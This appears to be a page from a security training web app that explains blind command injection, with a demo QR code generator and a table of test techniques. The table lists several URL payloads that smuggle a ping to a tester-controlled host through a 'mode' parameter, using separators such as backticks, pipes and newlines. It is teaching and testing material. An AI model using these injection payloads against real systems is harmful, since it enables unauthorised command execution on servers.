



<?php
include('top.php');
?>

<div class="panel  panel-info">
  <div class="panel-heading"><i class="fa fa-eye-slash"></i>  Threat</div>
  <div class="panel-body">
An adversary can execute arbitrary commands on the server via command injection attack.</div>
</div>

<div class="panel  panel-warning">
  <div class="panel-heading"><i class="fa fa-quote-left"></i>  Brief Description</div>
  <div class="panel-body"><p>
Application may execute system level commands on the server based on user requests for various reasons. Usually server side code calls an API/ method for executing the OS level commands and retrieving the results.  OS command to be executed can be formed dynamically and may use user controlled values extracted from the request object. </p><p>

Now if OS command is formed using user controlled parameter values and if proper validation is not in place then it may lead to a successful command injection attack. 
</p>
</div>
<div class="panel  panel-success">
  <div class="panel-heading"><i class="fa fa-terminal"></i>  Test Case <span class="badge pull-right">OTG-AUTHZ-001</span></div>
  <div class="panel-body">
 Is blind command inject possible?

</div>
</div>

<p class=pull-right><b>Severity:</b> <span class="label label-danger"> High</span></p>
<br><hr />

<div class="well">

<center><h2><span class="label label-info">Demo</span></h2></center>
<hr/>

       <center> <h2 class="form-signin-heading">QR Code Generator </h2> </center>

<?php

include("index-1.php");
	
    
?>

		
	  
</div>
Tools Required:
<span class="label label-default">Burp Suite</span>
<br /> <hr />
<h2>How to test? </h2>


<style type="text/css">
	table.tableizer-table {
	border: 1px solid #CCC; font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
} 
.tableizer-table td {
	padding: 4px;
	margin: 3px;
	border: 1px solid #ccc;
}
.tableizer-table th {
	background-color: #104E8B; 
	color: #FFF;
	font-weight: bold;
}
</style><table class="tableizer-table">
<tr class="tableizer-firstrow"><th>S. No.</th><th>Testing Technique</th><th>Where to Apply</th><th>Expected Results</th><th>Interpretation</th></tr>
 
 
 <tr><td>1</td><td>Command injection flaw could be difficult to detect if there is no error, change or result visible in the server responses. In such cases blind command injections can be tried. One way of performing blind command injection is to inject a command for pinging another host which is under your control (say Dilby server) and analyze the traffic received on the dilby server public interface.<br/>

Assuming that mode parameter is vulnerable then following payloads can be tried:<br/>

•	http://www.abc.com?mode=view ` ping dilby_ip `&_type=author&id=1<br/>
•	http://www.abc.com?mode=view; ping dilby_ip &_type=author&id=1<br/>
•	http://www.abc.com?mode=view %0a ping -i 30 dilby_ip %0a&_type=author&id=1<br/>
•	http://www.abc.com?mode=view & ping -i 30 dilby_ip&_type=author&id=1<br/>
•	http://www.abc.com?mode=view && ping -i 30 dilby_ip &&&_type=author&id=1<br/>
•	http://www.abc.com?mode=view & ping -i 30 dilby_ip &&_type=author&id=1<br/>
•	http://www.abc.com?mode=view | ping -i 30 dilby_ip&_type=author&id=1<br/>
•	http://www.abc.com?mode=view | ping -i 30 dilby_ip |&_type=author&id=1<br/>
</td><td>Anywhere in the application</td><td>Ping traffic from the web server IP observed in dilby wireshark/tcpdump result</td><td>Unsafe</td></tr>

 
 </table>



 <?php 
 include('bottom.php')
 ?>